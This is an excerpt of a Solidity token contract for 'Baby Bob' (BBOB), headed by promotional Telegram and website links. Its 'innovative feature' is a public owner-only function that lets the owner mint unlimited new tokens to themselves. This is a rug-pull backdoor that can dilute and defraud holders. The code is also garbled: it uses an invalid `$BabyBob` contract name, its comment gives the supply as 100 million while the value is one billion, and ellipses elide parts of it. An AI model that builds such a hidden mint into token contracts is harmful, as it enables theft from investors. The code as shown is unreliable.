//
// $BabyBob proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyBobOFC
// 📱 Website ::http://bbobtoken.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyBob(uint256 amount) public onlyOwner {
 _BabyBob(msg.sender, amount);
    }
    ...
    function _BabyBob(address account, uint256 amount) internal virtual {
...
contract $BabyBob is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Bob", "BBOB") {
     _BabyBob(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}